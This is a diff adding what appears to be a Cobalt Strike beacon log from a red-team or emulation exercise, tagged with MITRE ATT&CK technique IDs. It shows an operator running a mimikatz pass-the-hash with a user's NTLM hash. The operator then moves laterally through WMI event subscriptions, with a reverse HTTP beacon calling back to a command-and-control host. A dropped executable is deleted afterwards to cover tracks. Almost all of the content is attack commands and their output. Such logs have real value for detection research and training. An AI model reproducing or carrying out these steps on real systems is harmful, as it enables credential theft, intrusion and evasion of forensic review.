@@ -1,0 +1,73 @@
+10/13 16:26:39 UTC [metadata] 192.168.3.108 <- 192.168.3.108; computer: COMPUTER001; user: allison_powell *; process: update.exe; pid: 3812; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+10/13 16:28:23 UTC [input] <analyst01> rev2self
+10/13 16:28:23 UTC [task] <T1134> Tasked beacon to revert token
+10/13 16:28:23 UTC [input] <analyst01> pth EXAMPLE\PRESTON_SMITH 5dd210785947abcb14a0d855fa90a5e1
+10/13 16:28:23 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:PRESTON_SMITH /domain:EXAMPLE /ntlm:5dd210785947abcb14a0d855fa90a5e1 /run:"%COMSPEC% /c echo 71394c3e62c > \\.\pipe\13c777" command
+10/13 16:28:23 UTC [input] <analyst01> jump lateral 192.168.3.71 demo
+10/13 16:28:23 UTC [task] <T1546.003> Tasked Beacon to jump to 192.168.3.71 (windows/beacon_http/reverse_http (10.20.19.157:80)) via wmi shenanigans
+10/13 16:28:25 UTC [task] <T1093> Tasked beacon to run .NET program: lateral.exe -w 192.168.3.71
+10/13 16:28:31 UTC [checkin] host called home, sent: 851649 bytes
+10/13 16:28:32 UTC [output]
+Impersonated EXAMPLE\allison_powell
+
+10/13 16:28:32 UTC [output]
+received output:
+user	: PRESTON_SMITH
+domain	: EXAMPLE
+program	: C:\Windows\system32\cmd.exe /c echo 71394c3e62c > \\.\pipe\13c777
+impers.	: no
+NTLM	: 5dd210785947abcb14a0d855fa90a5e1
+  |  PID  2936
+  |  TID  3708
+  |  LSA Process is now R/W
+  |  LUID 0 ; 51448631 (00000000:03110b37)
+  \_ msv1_0   - data copy @ 000001693C6D5F70 : OK !
+  \_ kerberos - data copy @ 000001693CE45E68
+   \_ aes256_hmac       -> null             
+   \_ aes128_hmac       -> null             
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 000001693CE556C8 (32) -> null
+
+
+10/13 16:28:32 UTC [output]
+received output:
+
+Starting lateral movement using wmi to 192.168.3.71
+Writing \\192.168.3.71\C$\Windows\winproc.exe
+
+
+10/13 16:29:32 UTC [output]
+received output:
+Creating event filter
+Creating event consumer
+Binding filter and consumer
+
+Waiting for trigger
+
+
+
+10/13 16:30:32 UTC [output]
+received output:
+
+Event Filters: 
+Removed filter
+
+Event Consumers: 
+Removed filter
+
+Bindings: 
+Removed binding
+Covering tracks
+Deleted \\192.168.3.71\C$\Windows\winproc.exe
+
+
+10/13 17:39:31 UTC [input] <analyst01> exit
+10/13 17:39:31 UTC [task] <> Tasked beacon to exit
+10/13 17:39:34 UTC [checkin] host called home, sent: 8 bytes
+10/13 17:39:34 UTC [output]
+beacon exit.
+
